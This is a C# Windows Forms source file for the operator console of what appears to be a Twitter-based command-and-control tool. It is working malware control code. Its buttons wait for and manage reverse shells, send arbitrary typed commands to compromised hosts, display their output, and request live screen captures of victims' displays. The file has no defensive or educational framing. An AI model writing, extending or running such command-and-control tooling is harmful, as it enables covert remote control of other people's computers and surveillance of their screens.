using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Sockets;
using System.IO;
using TwitterCommandAndControl;

namespace ControlCenter
{
    public partial class Main : Form
    {
        private Screen display;
        private TcpClient Client { get; set; }
        public Main()
        {
            InitializeComponent();
        }

        private void ShellButton_Click(object sender, EventArgs e)
        {
            if (Client == null || !Client.Connected)
            {
                ShellButton.Enabled = false;
                ShellOutput.AppendText("Waiting for reverse shell..." + Environment.NewLine);
                Task.Run(() =>
                {
                    Client = ReverseShellHandler.Request(ShellPrefix.Text);
                    ShellButton.Invoke(new MethodInvoker(() => { ShellButton.Enabled = true; }));
                    if (Client != null && Client.Connected)
                    {
                        ShellOutput.Invoke(new MethodInvoker(() => { ShellOutput.AppendText("Reverse shell established!" + Environment.NewLine); }));
                        HandleClient();
                    }
                    else
                    {
                        ShellOutput.Invoke(new MethodInvoker(() => { ShellOutput.AppendText("Failed to establish reverse shell!" + Environment.NewLine); }));
                        Client = null;
                    }
                });
            }
        }

        private void HandleClient()
        {
            Task.Run(() =>
            {
                while (Client != null && Client.Connected)
                {
                    var reader = new StreamReader(Client.GetStream());
                    var output = reader.ReadLine();
                    while (!string.IsNullOrEmpty(output))
                    {
                        ShellOutput.Invoke(new MethodInvoker(() => { ShellOutput.AppendText(output + Environment.NewLine); }));
                        try { output = reader.ReadLine(); }
                        catch { output = null; }
                    }

                }
                ShellOutput.Invoke(new MethodInvoker(() => { ShellOutput.AppendText("Reverse shell lost!" + Environment.NewLine); }));
            });
        }

        private void CommandButton_Click(object sender, EventArgs e)
        {
            if (Client != null && Client.Connected)
            {
                var writer = new StreamWriter(Client.GetStream());
                writer.WriteLine(CommandText.Text);
                writer.Flush();
                CommandText.Clear();
            }
            else
                ShellOutput.AppendText("Not connected!" + Environment.NewLine);
        }

        private void ScreenCapture_Click(object sender, EventArgs e)
        {
            ScreenCapture.Enabled = false;
            ShellOutput.AppendText("Requesting Screen Capture..." + Environment.NewLine);
            display = new Screen();
            display.Show();
            Task.Run(() =>
            {
                Client = ScreenCaptureHandler.Request(ShellPrefix.Text);
                ShellButton.Invoke(new MethodInvoker(() => { ScreenCapture.Enabled = true; }));
                if (Client != null && Client.Connected)
                {
                    ShellOutput.Invoke(new MethodInvoker(() => { ShellOutput.AppendText("Screen Capture Successful!" + Environment.NewLine); }));
                    display.Client = Client;
                }
                else
                {
                    ShellOutput.Invoke(new MethodInvoker(() => { ShellOutput.AppendText("Screen Capture Failed!" + Environment.NewLine); }));
                    Client = null;
                }
            });
        }
    }
}
